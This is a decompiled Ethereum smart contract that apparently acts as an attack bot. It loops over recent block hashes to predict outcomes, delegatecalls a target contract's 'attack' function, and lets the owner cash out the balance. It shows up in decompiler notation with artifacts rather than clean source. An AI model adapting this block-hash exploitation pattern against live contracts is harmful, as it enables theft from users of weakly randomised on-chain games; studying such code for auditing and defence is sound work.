contract main {


// =======================  Init code  ======================


address stor0;
uint256 stor1;
uint256 stor2;
uint256 stor3;

function _fallback() payable {
    stor0 = 0x3f593a15eb60672687c32492b62ed3e10e149ec6
    stor2 = 0
    stor3 = 0
    stor1 = msg.sender or Mask(96, 160, stor1)
    return code.data[82 len 833]
}



// =====================  Runtime code  =====================


address targetAddress;
uint256 stor0;
address owner;
uint256 stor2;
uint256 stor3;
uint256 stor4;
uint256 stor5;
uint256 stor6;

function owner() {
    return owner
}

function target() {
    return address(targetAddress)
}

function cashOut() {
    call owner with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    require ext_call.success
}

function unvest(uint256 arg1, uint256 arg2, uint256 arg3, uint256 arg4, uint256 arg5, bool arg6) {
    require owner == msg.sender
    uint256(stor0) = arg1 or Mask(96, 160, uint256(stor0))
}

function _fallback() payable {
    idx = 0
    s = 0
    while idx < stor6:
        if uint32(uint32(block.hash(block.number + -idx - 1)) / 42949673) > 75:
            idx = idx + 1
            s = uint32(uint32(block.hash(block.number + -idx - 1)) / 42949673)
            continue 
        stor3++
    delegate address(targetAddress) with:
       funct (Mask(32, 224, sha3('attack(uint256,uint256,uint256[]', ')')) >> 224)
         gas gas_remaining - 50 wei
        args stor4, stor5, 6
    require delegate.return_code
    require delegate.return_data[0]
    stor2++
}

function sub_6f064aa5(?) {
    mem[128 len 32 * arg3.length] = call.data[arg3 + 36 len 32 * arg3.length]
    require owner == msg.sender
    stor4 = arg1
    stor5 = arg2
    stor6 = arg3.length
    if not arg3.length:
        idx = 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f
        while stor6 - 0x9addddcec1d7ba6ad726df49aeea3e93fb0c1037d551236841a60c0c883f2c1 > idx:
            stor[idx] = 0
            idx = idx + 1
            continue 
    else:
        s = 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f
        idx = 128
        while (32 * arg3.length) + 128 > idx:
            stor[s] = mem[idx]
            s = s + 1
            idx = idx + 32
            continue 
        idx = (Mask(251, 0, (32 * arg3.length) + 31) >> 5) - 0x9addddcec1d7ba6ad726df49aeea3e93fb0c1037d551236841a60c0c883f2c1
        while stor6 - 0x9addddcec1d7ba6ad726df49aeea3e93fb0c1037d551236841a60c0c883f2c1 > idx:
            stor[idx] = 0
            idx = idx + 1
            continue 
}



}
